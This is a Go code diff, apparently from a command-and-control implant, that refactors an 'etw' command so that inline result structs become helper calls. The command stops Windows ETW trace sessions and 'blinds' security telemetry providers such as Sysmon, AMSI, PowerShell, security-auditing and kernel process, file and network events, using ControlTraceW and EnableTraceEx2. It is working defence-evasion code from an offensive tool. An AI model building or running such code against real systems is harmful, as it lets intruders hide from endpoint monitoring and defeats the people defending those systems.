@@ -67,11 +67,7 @@ const (
 func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
 	var params etwParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if params.Action == "" {
@@ -92,11 +88,7 @@ func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
 	case "enable":
 		return etwEnable(params.SessionName, params.Provider)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use sessions, providers, stop, blind, query, enable)", params.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use sessions, providers, stop, blind, query, enable)", params.Action)
 	}
 }
 
@@ -124,11 +116,7 @@ func etwSessions() structs.CommandResult {
 		uintptr(unsafe.Pointer(&sessionCount)),
 	)
 	if r1 != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("QueryAllTracesW failed: %v (0x%X)", err, r1),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("QueryAllTracesW failed: %v (0x%X)", err, r1)
 	}
 
 	var sb strings.Builder
@@ -200,11 +188,7 @@ func etwProviders() structs.CommandResult {
 	)
 
 	if requiredSize == 0 {
-		return structs.CommandResult{
-			Output:    "No ETW providers found or EnumerateTraceGuidsEx not available",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("No ETW providers found or EnumerateTraceGuidsEx not available")
 	}
 
 	buf := make([]byte, requiredSize)
@@ -216,11 +200,7 @@ func etwProviders() structs.CommandResult {
 		uintptr(unsafe.Pointer(&requiredSize)),
 	)
 	if r1 != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("EnumerateTraceGuidsEx failed: %v (0x%X)", err, r1),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("EnumerateTraceGuidsEx failed: %v (0x%X)", err, r1)
 	}
 
 	// Parse the array of GUIDs
@@ -289,11 +269,7 @@ func etwStop(sessionName string) structs.CommandResult {
 
 	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error converting session name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error converting session name: %v", err)
 	}
 
 	r1, _, sysErr := procControlTraceW.Call(
@@ -320,11 +296,7 @@ func etwStop(sessionName string) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Successfully stopped ETW trace session: %s\nTelemetry from this session will no longer be collected.", sessionName),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Successfully stopped ETW trace session: %s\nTelemetry from this session will no longer be collected.", sessionName)
 }
 
 // etwBlind disables a specific ETW provider within a trace session using EnableTraceEx2
@@ -339,21 +311,13 @@ func etwBlind(sessionName, provider string) structs.CommandResult {
 		}
 	}
 	if provider == "" {
-		return structs.CommandResult{
-			Output:    "Error: provider is required for blind action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: provider is required for blind action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client")
 	}
 
 	// Step 1: Resolve provider to GUID
 	providerGUID, resolvedName := resolveProviderGUID(provider)
 	if providerGUID == "" {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider)
 	}
 
 	// Step 2: Query the session to get its handle
@@ -364,11 +328,7 @@ func etwBlind(sessionName, provider string) structs.CommandResult {
 
 	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error converting session name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error converting session name: %v", err)
 	}
 
 	r1, _, _ := procControlTraceW.Call(
@@ -401,11 +361,7 @@ func etwBlind(sessionName, provider string) structs.CommandResult {
 
 	guid, err := windows.GUIDFromString(guidStr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Invalid provider GUID '%s': %v", providerGUID, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Invalid provider GUID '%s': %v", providerGUID, err)
 	}
 
 	// Step 4: Disable the provider using EnableTraceEx2
@@ -437,11 +393,7 @@ func etwBlind(sessionName, provider string) structs.CommandResult {
 		displayName = providerGUID
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Successfully disabled ETW provider '%s' (%s) in session '%s'\nThe session remains active but this provider will no longer generate events.", displayName, providerGUID, sessionName),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Successfully disabled ETW provider '%s' (%s) in session '%s'\nThe session remains active but this provider will no longer generate events.", displayName, providerGUID, sessionName)
 }
 
 // etwQuery queries a specific ETW trace session for detailed information
@@ -461,11 +413,7 @@ func etwQuery(sessionName string) structs.CommandResult {
 
 	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error converting session name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error converting session name: %v", err)
 	}
 
 	r1, _, sysErr := procControlTraceW.Call(
@@ -586,20 +534,12 @@ func etwEnable(sessionName, provider string) structs.CommandResult {
 		}
 	}
 	if provider == "" {
-		return structs.CommandResult{
-			Output:    "Error: provider is required for enable action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: provider is required for enable action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client")
 	}
 
 	providerGUID, resolvedName := resolveProviderGUID(provider)
 	if providerGUID == "" {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider)
 	}
 
 	props := make([]byte, eventTracePropsSize)
@@ -609,11 +549,7 @@ func etwEnable(sessionName, provider string) structs.CommandResult {
 
 	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error converting session name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error converting session name: %v", err)
 	}
 
 	r1, _, _ := procControlTraceW.Call(
@@ -644,11 +580,7 @@ func etwEnable(sessionName, provider string) structs.CommandResult {
 
 	guid, err := windows.GUIDFromString(guidStr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Invalid provider GUID '%s': %v", providerGUID, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Invalid provider GUID '%s': %v", providerGUID, err)
 	}
 
 	// Re-enable with TRACE_LEVEL_VERBOSE (5) and all keywords
@@ -680,11 +612,7 @@ func etwEnable(sessionName, provider string) structs.CommandResult {
 		displayName = providerGUID
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Successfully re-enabled ETW provider '%s' (%s) in session '%s'\nThe provider will resume generating events.", displayName, providerGUID, sessionName),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Successfully re-enabled ETW provider '%s' (%s) in session '%s'\nThe provider will resume generating events.", displayName, providerGUID, sessionName)
 }
 
 // resolveProviderGUID moved to command_helpers.go
